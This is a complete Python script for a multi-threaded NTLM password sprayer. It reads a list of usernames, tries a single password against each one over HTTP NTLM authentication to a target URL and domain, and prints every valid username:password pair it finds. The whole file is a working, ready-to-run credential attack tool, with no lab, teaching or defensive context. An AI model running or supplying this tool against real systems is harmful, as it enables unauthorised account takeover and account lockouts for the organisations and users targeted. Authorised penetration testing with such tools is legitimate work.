import argparse
import requests
import sys
from requests_ntlm import HttpNtlmAuth
from concurrent.futures import ThreadPoolExecutor

class NTLMSprayer:
    def __init__(self, fqdn, users_file, verbose=False):
        self.fqdn = fqdn
        self.verbose = verbose
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.HTTP_AUTH_FAILED_CODE = 401
        
        # Load users from file
        try:
            with open(users_file, 'r') as f:
                self.users = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Error: User file '{users_file}' not found.")
            sys.exit(1)

    def check_user(self, user, password, url):
        """Helper function to test a single user"""
        try:
            # Construct the auth object
            # Uses DOMAIN\User format
            auth = HttpNtlmAuth(self.fqdn + "\\" + user, password)
            response = requests.get(url, auth=auth, timeout=5)
            
            if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                print(f"[+] Valid credential: {user}:{password}")
                return True
            elif self.verbose and response.status_code == self.HTTP_AUTH_FAILED_CODE:
                print(f"[-] Failed: {user}")
                
        except requests.exceptions.RequestException as e:
            # Handle timeouts or connection errors so the script doesn't crash
            print(f"[!] Error checking {user}: {e}")
        return False

    def password_spray(self, password, url):
        print(f"[*] Starting threaded spray with password: {password}")
        print(f"[*] Target URL: {url}")
        print(f"[*] User count: {len(self.users)}")
        
        valid_count = 0
        
        # ThreadPoolExecutor manages the threads
        # max_workers=10
        with ThreadPoolExecutor(max_workers=10) as executor:
            # This creates a list of tasks to run
            # We pass the method (self.check_user) and its arguments
            futures = [executor.submit(self.check_user, user, password, url) for user in self.users]
            
            # Wait for them to complete and count successes
            for future in futures:
                if future.result():
                    valid_count += 1

        print(f"[*] Spray completed. {valid_count} valid pairs found.")

def main():
    # Initialize Argument Parser
    parser = argparse.ArgumentParser(description="Multi-threaded NTLM Password Sprayer")
    
    # Define arguments
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://target.local/resource)")
    parser.add_argument("-f", "--fqdn", required=True, help="Domain FQDN (e.g., CONTOSO.LOCAL)")
    parser.add_argument("-U", "--users", required=True, help="Path to username file")
    parser.add_argument("-p", "--password", required=True, help="Password to spray")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed login attempts")

    # Parse arguments
    args = parser.parse_args()

    # Create the sprayer instance and run it
    sprayer = NTLMSprayer(args.fqdn, args.users, args.verbose)
    sprayer.password_spray(args.password, args.url)

if __name__ == "__main__":
    main()
